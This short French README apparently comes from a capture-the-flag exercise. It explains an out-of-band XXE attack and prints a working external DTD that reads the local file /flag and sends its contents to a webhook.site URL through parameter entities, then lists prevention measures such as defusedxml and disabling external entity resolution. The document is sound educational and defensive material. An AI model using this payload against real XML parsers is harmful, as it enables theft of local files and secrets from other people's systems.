
# Exemple d’attaque XXE (XML External Entity) via  serveur  DTD

## Description
Ce fichier DTD illustre une **attaque XXE (External Entity Injection)**, une vulnérabilité possible lorsque des applications XML ne désactivent pas la résolution des entités externes.  

---

## Contenu du fichier

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/26b4c872-1055-477b-a411-6b23838fc712?data=%file;'>">
%eval;
%exfil;
````

---

## Fonctionnement

1. **`%file`**
   → Charge le contenu du fichier local `/flag`.

2. **`%eval`**
   → Définit dynamiquement une nouvelle entité appelée `%exfil` qui enverra la donnée lue vers une URL distante.

3. **`%exfil`**
   → Effectue une requête HTTP GET vers `https://webhook.site/...` avec la valeur du fichier local comme paramètre `data`.

4. Si le parseur XML n’a **pas désactivé la résolution d’entités externes**, le contenu du fichier local sera envoyé à distance.

---

## Prévention

Pour éviter ce type de vulnérabilité :

* **Désactiver la résolution d’entités externes** dans les bibliothèques XML.
  Exemple :

  * **Python** → utiliser `defusedxml`
  * **Java** → `XMLInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false)`
* **Ne jamais parser du XML non fiable** sans validation stricte.
* **Utiliser des parsers sécurisés** (`defusedxml`, `lxml` avec options de sécurité, etc.).

---

